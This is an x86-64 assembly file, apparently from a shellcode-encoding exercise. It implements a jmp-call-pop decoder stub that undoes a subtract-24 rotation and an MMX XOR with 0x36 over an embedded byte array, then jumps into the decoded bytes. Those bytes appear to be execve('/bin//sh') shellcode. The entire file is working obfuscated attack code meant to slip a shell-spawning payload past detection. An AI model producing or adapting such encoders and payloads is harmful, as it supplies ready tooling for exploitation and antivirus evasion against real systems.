global _start

_start:

      jmp short master       ; Jumps to function "master".

main:

      pop rbp                ; Pops the value to use when XORing in RBP.

      lea rdi, [rbp + 8]     ; Points to the shellcode.

      xor rcx, rcx           ; Zeroes out RCX.
      mov cl, bytes_length   ; Gives cl the length of the shellcode. This sets a counter.

rot:

      sub byte [rdi], 24     ; Negatively rotates RDI by 24.
      inc rdi                ; Increments RDI.
      loop rot               ; Loops this process.

      lea rdi, [rbp + 8]     ; Points to the shellcode.

      xor rcx, rcx           ; Zeroes out RCX.
      mov cl, 5              ; Gives cl the length of the shellcode. As the following operation will be done from 8-bytes in 8-bytes, it isn't required to specify the complete length of the shellcode.

xor:

       movq mm0, qword [rbp] ; Saves QWORD RBP into MM0.
       movq mm1, qword [rdi] ; Saves QWORD RDI into MM1.

       pxor mm0, mm1         ; XORs MM0 and MM1.

       movq qword [rdi], mm0 ; Saves the value of MM0 (XORed piece of shellcode) into RDI (stores original shellcode).
       add rdi, 8            ; Adds 8 to RDI in order to continue with the process.

       loop xor              ; Loops this process.

       jmp bytes             ; Jumps to the original shellcode.

master:

      call main
      value: db 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36
      bytes: db 0x96,0x1f,0x0e,0x96,0x1f,0xd8,0x96,0x1f,0x05,0x7e,0x96,0xa5,0x31,0x31,0x6c,0x77,0x70,0x31,0x5d,0x76,0x7d,0x96,0xd7,0xe9,0x7e,0x96,0xd7,0xec,0x79,0x96,0xd7,0xe8,0x9e,0x25,0x51,0x4b
      bytes_length equ $-bytes
